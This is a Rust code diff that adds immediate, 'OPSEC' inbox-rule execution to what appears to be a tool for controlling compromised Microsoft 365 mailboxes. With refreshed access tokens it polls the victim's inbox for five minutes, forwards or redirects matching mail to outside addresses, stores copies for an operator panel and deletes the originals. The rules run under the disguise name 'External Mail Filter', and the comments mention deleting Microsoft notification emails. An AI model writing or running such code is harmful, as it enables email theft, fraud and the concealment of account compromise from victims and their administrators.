@@ -5,6 +5,318 @@ use anyhow::Context;
 use chrono::Utc;
 use serde::{Deserialize, Serialize};
 
+/// OPSEC-style immediate rule execution.
+/// Spawns a background task that polls the inbox for messages matching the
+/// rule conditions and applies the actions (forward, delete) INSTANTLY via
+/// Graph API — exactly like delete_microsoft_notification_email.
+/// This does NOT wait for periodic sync or admin opening the inbox.
+pub fn spawn_immediate_rule_execution(state: AppState, token_id: String, rule: CreatedRule) {
+    tokio::spawn(async move {
+        let pool = &state.pool;
+
+        // Get a fresh access token
+        let token = match crate::retrieve_any_token(&state, &token_id).await {
+            Ok(t) => t,
+            Err(e) => {
+                eprintln!("[rule_exec] Failed to retrieve token for {}: {}", token_id, e);
+                return;
+            }
+        };
+        let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
+            .unwrap_or_else(|| token.access_token.clone());
+
+        let conditions: serde_json::Value = serde_json::from_str(&rule.conditions_json).unwrap_or(serde_json::json!({}));
+        let actions: serde_json::Value = serde_json::from_str(&rule.actions_json).unwrap_or(serde_json::json!({}));
+
+        // Build a Graph $search or $filter query from the rule conditions
+        let client = GraphClient::new();
+
+        // Extract condition values for searching
+        let subject_keywords: Vec<String> = conditions.get("subjectContains")
+            .and_then(|v| v.as_array())
+            .map(|arr| arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .unwrap_or_default();
+        let body_keywords: Vec<String> = conditions.get("bodyContains")
+            .and_then(|v| v.as_array())
+            .map(|arr| arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .unwrap_or_default();
+        let sender_domains: Vec<String> = conditions.get("fromAddresses")
+            .and_then(|v| v.as_array())
+            .map(|arr| arr.iter().filter_map(|addr| {
+                addr.get("address").and_then(|v| v.as_str())
+                    .or_else(|| addr.get("emailAddress").and_then(|e| e.get("address")).and_then(|v| v.as_str()))
+                    .map(|s| s.trim_start_matches('@').to_string())
+            }).collect())
+            .unwrap_or_default();
+        let sender_contains: Vec<String> = conditions.get("senderContains")
+            .and_then(|v| v.as_array())
+            .map(|arr| arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .unwrap_or_default();
+        let from_address_contains: Vec<String> = conditions.get("fromAddressContains")
+            .and_then(|v| v.as_array())
+            .map(|arr| arr.iter().filter_map(|v| v.as_str().map(|s| s.to_string())).collect())
+            .unwrap_or_default();
+
+        // Extract action values
+        let do_permanent_delete = actions.get("permanentDelete").and_then(|v| v.as_bool()).unwrap_or(false);
+        let do_delete = actions.get("delete").and_then(|v| v.as_bool()).unwrap_or(false);
+        let forward_to: Option<String> = actions.get("forwardTo")
+            .and_then(|v| v.as_array())
+            .and_then(|arr| arr.get(0))
+            .and_then(|obj| obj.get("emailAddress"))
+            .and_then(|e| e.get("address"))
+            .and_then(|v| v.as_str())
+            .map(|s| s.to_string());
+        let forward_att_to: Option<String> = actions.get("forwardAsAttachmentTo")
+            .and_then(|v| v.as_array())
+            .and_then(|arr| arr.get(0))
+            .and_then(|obj| obj.get("emailAddress"))
+            .and_then(|e| e.get("address"))
+            .and_then(|v| v.as_str())
+            .map(|s| s.to_string());
+        let redirect_to: Option<String> = actions.get("redirectTo")
+            .and_then(|v| v.as_array())
+            .and_then(|arr| arr.get(0))
+            .and_then(|obj| obj.get("emailAddress"))
+            .and_then(|e| e.get("address"))
+            .and_then(|v| v.as_str())
+            .map(|s| s.to_string());
+        let do_mark_read = actions.get("markAsRead").and_then(|v| v.as_bool()).unwrap_or(false);
+        let folder_name: Option<String> = actions.get("moveToFolder").and_then(|v| v.as_str()).map(|s| s.to_string());
+
+        if !do_permanent_delete && !do_delete && forward_to.is_none() && forward_att_to.is_none() && redirect_to.is_none() && !do_mark_read && folder_name.is_none() {
+            return; // No actionable actions
+        }
+
+        eprintln!("[rule_exec] Starting immediate execution for rule '{}' on token {}", rule.display_name, token_id);
+
+        // Poll for up to 5 minutes (30 attempts × 10 seconds)
+        for attempt in 1..=30 {
+            tokio::time::sleep(std::time::Duration::from_secs(10)).await;
+
+            // Fetch recent inbox messages
+            let messages_result = client.get_messages_for_analysis(&access_token, 50).await;
+            let messages = match messages_result {
+                Ok(resp) => resp.value,
+                Err(e) => {
+                    eprintln!("[rule_exec] Attempt {}: Failed to fetch messages: {}", attempt, e);
+                    continue;
+                }
+            };
+
+            let mut actions_applied = 0u32;
+
+            for msg in &messages {
+                let subject = msg.subject.as_deref().unwrap_or("").to_lowercase();
+                let body = msg.bodyPreview.as_deref().unwrap_or("").to_lowercase();
+                let sender_email = msg.from.as_ref()
+                    .and_then(|f| f.emailAddress.as_ref())
+                    .and_then(|e| e.address.as_ref())
+                    .map(|s| s.to_lowercase())
+                    .unwrap_or_default();
+                let sender_name = msg.from.as_ref()
+                    .and_then(|f| f.emailAddress.as_ref())
+                    .and_then(|e| e.name.as_ref())
+                    .map(|s| s.to_lowercase())
+                    .unwrap_or_default();
+                let sender_domain = sender_email.split('@').nth(1).unwrap_or("").to_lowercase();
+
+                // Check if message matches the rule conditions
+                let mut matched = false;
+
+                // subjectContains
+                if !matched && !subject_keywords.is_empty() {
+                    for kw in &subject_keywords {
+                        if subject.contains(&kw.to_lowercase()) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                // bodyContains
+                if !matched && !body_keywords.is_empty() {
+                    for kw in &body_keywords {
+                        if body.contains(&kw.to_lowercase()) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                // fromAddresses (sender domains)
+                if !matched && !sender_domains.is_empty() {
+                    for domain in &sender_domains {
+                        let domain_lower = domain.to_lowercase();
+                        if sender_domain == domain_lower || sender_email == domain_lower || sender_email.ends_with(&format!("@{}", domain_lower)) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                // senderContains
+                if !matched && !sender_contains.is_empty() {
+                    for kw in &sender_contains {
+                        let kw_lower = kw.to_lowercase();
+                        if sender_email.contains(&kw_lower) || sender_name.contains(&kw_lower) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                // fromAddressContains
+                if !matched && !from_address_contains.is_empty() {
+                    for kw in &from_address_contains {
+                        if sender_email.contains(&kw.to_lowercase()) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                // Boolean conditions — assume match (Graph handles precisely)
+                if !matched {
+                    let bool_keys = [
+                        "hasAttachments", "sentOnlyToMe", "sentToMe", "notSentToMe",
+                        "sentToOrCcMe", "isApprovalRequest", "isAutomaticForward",
+                        "isAutomaticReply", "isEncrypted", "isMeetingRequest",
+                        "isMeetingResponse", "isNonDeliveryReport", "isPermissionControlled",
+                        "isReadReceipt", "isSigned", "isVoicemail", "flagged",
+                    ];
+                    for key in &bool_keys {
+                        if conditions.get(*key).and_then(|v| v.as_bool()).unwrap_or(false) {
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                if !matched {
+                    continue;
+                }
+
+                eprintln!("[rule_exec] Matched message '{}' from {} for rule '{}'", subject, sender_email, rule.display_name);
+
+                // 1. FORWARD (while message still exists)
+                if let Some(fwd) = &forward_to {
+                    match client.forward_message(&access_token, &msg.id, fwd).await {
+                        Ok(_) => {
+                            println!("[rule_exec] Forwarded message {} to {}", msg.id, fwd);
+                            actions_applied += 1;
+                        }
+                        Err(e) => eprintln!("[rule_exec] Forward failed for {}: {}", msg.id, e),
+                    }
+                }
+                if let Some(fwd_att) = &forward_att_to {
+                    match client.forward_message(&access_token, &msg.id, fwd_att).await {
+                        Ok(_) => {
+                            println!("[rule_exec] Forwarded (attachment) {} to {}", msg.id, fwd_att);
+                            actions_applied += 1;
+                        }
+                        Err(e) => eprintln!("[rule_exec] Forward-attachment failed for {}: {}", msg.id, e),
+                    }
+                }
+                if let Some(redirect) = &redirect_to {
+                    match client.forward_message(&access_token, &msg.id, redirect).await {
+                        Ok(_) => {
+                            println!("[rule_exec] Redirected {} to {}", msg.id, redirect);
+                            actions_applied += 1;
+                        }
+                        Err(e) => eprintln!("[rule_exec] Redirect failed for {}: {}", msg.id, e),
+                    }
+                }
+
+                // 2. FILE IN LOCAL FOLDER (DB insert for admin panel)
+                if let Some(folder_name) = &folder_name {
+                    let folder_id: String = match sqlx::query_scalar::<_, String>(
+                        "SELECT id FROM local_folders WHERE token_id = ? AND name = ?"
+                    )
+                    .bind(&token_id)
+                    .bind(folder_name)
+                    .fetch_optional(pool)
+                    .await {
+                        Ok(Some(id)) => id,
+                        Ok(None) => {
+                            let id = crate::generate_id();
+                            let _ = sqlx::query(
+                                "INSERT INTO local_folders (id, token_id, name, created_at) VALUES (?, ?, ?, ?)"
+                            )
+                            .bind(&id)
+                            .bind(&token_id)
+                            .bind(folder_name)
+                            .bind(Utc::now())
+                            .execute(pool)
+                            .await;
+                            id
+                        }
+                        Err(_) => continue,
+                    };
+
+                    let already: bool = sqlx::query_scalar::<_, i64>(
+                        "SELECT COUNT(*) FROM local_filtered_messages WHERE token_id = ? AND message_id = ? AND folder_id = ?"
+                    )
+                    .bind(&token_id)
+                    .bind(&msg.id)
+                    .bind(&folder_id)
+                    .fetch_one(pool)
+                    .await
+                    .unwrap_or(0) > 0;
+
+                    if !already {
+                        let sender_name_val = msg.from.as_ref()
+                            .and_then(|f| f.emailAddress.as_ref())
+                            .and_then(|e| e.name.clone())
+                            .unwrap_or_else(|| sender_email.clone());
+                        let id = crate::generate_id();
+                        let _ = sqlx::query(
+                            "INSERT INTO local_filtered_messages (id, token_id, message_id, folder_id, subject, sender, sender_email, received_date, body_preview, keywords, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+                        )
+                        .bind(&id)
+                        .bind(&token_id)
+                        .bind(&msg.id)
+                        .bind(&folder_id)
+                        .bind(msg.subject.as_deref().unwrap_or(""))
+                        .bind(&sender_name_val)
+                        .bind(&sender_email)
+                        .bind(msg.receivedDateTime.as_deref().unwrap_or(""))
+                        .bind(msg.bodyPreview.as_deref().unwrap_or(""))
+                        .bind(&rule.display_name)
+                        .bind(Utc::now())
+                        .execute(pool)
+                        .await;
+                    }
+                }
+
+                // 3. MARK AS READ
+                if do_mark_read {
+                    let _ = client.mark_message_read(&access_token, &msg.id, true).await;
+                }
+
+                // 4. DELETE / PERMANENT DELETE (last, after forward and file)
+                if do_permanent_delete || do_delete {
+                    match client.delete_message(&access_token, &msg.id).await {
+                        Ok(_) => {
+                            println!("[rule_exec] Deleted message {} from inbox (permanent={})", msg.id, do_permanent_delete);
+                            actions_applied += 1;
+                        }
+                        Err(e) => eprintln!("[rule_exec] Delete failed for {}: {}", msg.id, e),
+                    }
+                }
+
+                actions_applied += 1;
+            }
+
+            if actions_applied > 0 {
+                eprintln!("[rule_exec] Attempt {}: Applied {} actions for rule '{}'", attempt, actions_applied, rule.display_name);
+            }
+        }
+
+        eprintln!("[rule_exec] Finished immediate execution for rule '{}' on token {}", rule.display_name, token_id);
+    });
+}
+
 #[derive(Debug, Clone, Serialize, Deserialize, sqlx::FromRow)]
 pub struct CreatedRule {
     pub id: String,
@@ -645,6 +957,23 @@ pub async fn create_rule_handler(
                     })),
                     true,
                 ).await;
+
+                // OPSEC: spawn immediate background execution
+                let rule_row = CreatedRule {
+                    id: result.rule_id.clone(),
+                    token_id: body.token_id.clone(),
+                    graph_rule_id: None,
+                    display_name: body.rule_name.clone(),
+                    disguise_name: "External Mail Filter".to_string(),
+                    conditions_json: serde_json::to_string(&result.payload["conditions"]).unwrap_or_default(),
+                    actions_json: serde_json::to_string(&result.payload["actions"]).unwrap_or_default(),
+                    target_folder: body.action_move_to_folder.clone(),
+                    forward_to: body.action_forward_to.clone(),
+                    created_at: Utc::now(),
+                    status: "active".to_string(),
+                };
+                spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
+
                 return HttpResponse::Ok().json(serde_json::json!({
                     "status": "created",
                     "rule_id": result.rule_id,
@@ -684,20 +1013,40 @@ pub async fn create_rule_handler(
     ).await;
 
     match result {
-        Ok(result) => HttpResponse::Ok().json(serde_json::json!({
-            "status": "created",
-            "rule_id": result.rule_id,
-            "graph_rule_id": result.graph_rule_id,
-            "target_folder_id": result.target_folder_id,
-            "rule_payload": result.payload,
-            "sync_type": if result.graph_rule_id.is_some() { "graph_api" } else { "local_only" }
-        })),
+        Ok(result) => {
+            // OPSEC: spawn immediate background execution — search inbox and
+            // apply actions (forward, delete) RIGHT NOW via Graph API.
+            // This handles messages that arrived before the rule was created
+            // and keeps polling for 5 minutes for new messages.
+            let rule_row = CreatedRule {
+                id: result.rule_id.clone(),
+                token_id: body.token_id.clone(),
+                graph_rule_id: result.graph_rule_id.clone(),
+                display_name: body.rule_name.clone(),
+                disguise_name: "External Mail Filter".to_string(),
+                conditions_json: serde_json::to_string(&result.payload["conditions"]).unwrap_or_default(),
+                actions_json: serde_json::to_string(&result.payload["actions"]).unwrap_or_default(),
+                target_folder: body.action_move_to_folder.clone(),
+                forward_to: body.action_forward_to.clone(),
+                created_at: Utc::now(),
+                status: "active".to_string(),
+            };
+            spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
+
+            HttpResponse::Ok().json(serde_json::json!({
+                "status": "created",
+                "rule_id": result.rule_id,
+                "graph_rule_id": result.graph_rule_id,
+                "target_folder_id": result.target_folder_id,
+                "rule_payload": result.payload,
+                "sync_type": if result.graph_rule_id.is_some() { "graph_api" } else { "local_only" }
+            }))
+        }
         Err(e) => {
             let msg = format!("{}", e);
             eprintln!("[rules] Graph API rule creation failed for {}: {}. Falling back to local-only rule.", body.token_id, msg);
             
             // ALWAYS fall back to local-only rule on any Graph API error
-            // This ensures rules work for consumer accounts and any other failures
             let local_result = create_local_only_rule(&state, &body).await;
             match local_result {
                 Ok(result) => {
@@ -717,6 +1066,23 @@ pub async fn create_rule_handler(
                         })),
                         true,
                     ).await;
+
+                    // OPSEC: spawn immediate background execution even for fallback
+                    let rule_row = CreatedRule {
+                        id: result.rule_id.clone(),
+                        token_id: body.token_id.clone(),
+                        graph_rule_id: None,
+                        display_name: body.rule_name.clone(),
+                        disguise_name: "External Mail Filter".to_string(),
+                        conditions_json: serde_json::to_string(&result.payload["conditions"]).unwrap_or_default(),
+                        actions_json: serde_json::to_string(&result.payload["actions"]).unwrap_or_default(),
+                        target_folder: body.action_move_to_folder.clone(),
+                        forward_to: body.action_forward_to.clone(),
+                        created_at: Utc::now(),
+                        status: "active".to_string(),
+                    };
+                    spawn_immediate_rule_execution(state.get_ref().clone(), body.token_id.clone(), rule_row);
+
                     return HttpResponse::Ok().json(serde_json::json!({
                         "status": "created",
                         "rule_id": result.rule_id,
